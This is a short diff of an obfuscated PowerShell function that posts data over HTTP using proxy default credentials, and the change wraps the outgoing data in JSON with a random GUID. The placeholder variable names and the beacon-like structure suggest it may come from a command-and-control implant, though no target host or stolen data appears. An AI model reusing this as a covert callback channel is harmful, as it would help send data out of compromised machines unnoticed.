@@ -120,11 +120,12 @@ function VAR55 {
 		$VAR32.UserAgent = $VAR30
 		$VAR32.Timeout = 10000
 		$VAR32.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
-		try {
+		Try {
 			$VAR33 = $VAR32.GetRequestStream()
 			$VAR34 = New-Object System.IO.StreamWriter($VAR33)
-			$VAR34.Write($Data)
-		} finally {
+			$VAR11 = @{"ID"=[GUID]::NewGuid(); "data"=$Data} | ConvertTo-Json -Compress 			
+			$VAR34.Write($VAR11)
+		} Finally {
 			if($null -ne $VAR34) { 
 				$VAR34.Dispose() 
 			}
@@ -132,11 +133,12 @@ function VAR55 {
 				$VAR33.Dispose() 
 			}
 		}
-		try {
+		
+		Try {
 			$VAR35 = $VAR32.GetResponse().getResponseStream()
 			$VAR36 = New-Object System.IO.StreamReader($VAR35)
 			$VAR31 = $VAR36.ReadToEnd()
-		} catch {
+		} Catch {
 			$VAR31 = ""
 		}
 		return ($VAR31 | Out-String)
